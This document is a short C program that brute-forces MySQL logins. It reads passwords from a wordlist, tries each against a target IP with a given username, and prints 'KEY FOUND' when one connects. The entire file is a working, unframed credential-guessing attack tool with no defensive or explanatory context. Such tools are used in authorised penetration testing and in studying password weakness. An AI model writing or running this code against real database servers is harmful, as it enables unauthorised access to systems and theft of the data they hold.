#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "mysql.h"

void print_usage(const char *program_name) {
    printf("Usage: %s -l <username> -P <password_list> <target_ip> mysql\n", program_name);
}

int main(int argc, char *argv[]) {
    if (argc != 6 || strcmp(argv[5], "mysql") != 0) {
        print_usage(argv[0]);
        return 1;
    }

    const char *username = NULL;
    const char *password_list = NULL;
    const char *target_ip = NULL;

    for (int i = 1; i < argc - 1; i++) {
        if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) {
            username = argv[i + 1];
            i++;
        } else if (strcmp(argv[i], "-P") == 0 && i + 1 < argc) {
            password_list = argv[i + 1];
            i++;
        } else {
            target_ip = argv[i];
        }
    }

    if (username == NULL || password_list == NULL || target_ip == NULL) {
        print_usage(argv[0]);
        return 1;
    }

    FILE *file = fopen(password_list, "r");
    if (file == NULL) {
        perror("Failed to open password list");
        return 1;
    }

    char password[256];
    int found = 0;

    while (fgets(password, sizeof(password), file) != NULL) {
        password[strcspn(password, "\n")] = 0; // Remove newline character

        printf("TRYING PASSPHRASE: %s\n", password);

        MYSQL *conn = mysql_init(NULL);
        if (conn == NULL) {
            fprintf(stderr, "mysql_init() failed\n");
            fclose(file);
            return 1;
        }

        if (mysql_real_connect(conn, target_ip, username, password, NULL, 0, NULL, 0)) {
            printf("KEY FOUND: [ \"%s\" ]\n", password);
            found = 1;
            mysql_close(conn);
            break;
        }

        mysql_close(conn);
    }

    fclose(file);

    if (!found) {
        printf("KEY NOT FOUND\n");
    }

    return 0;
}
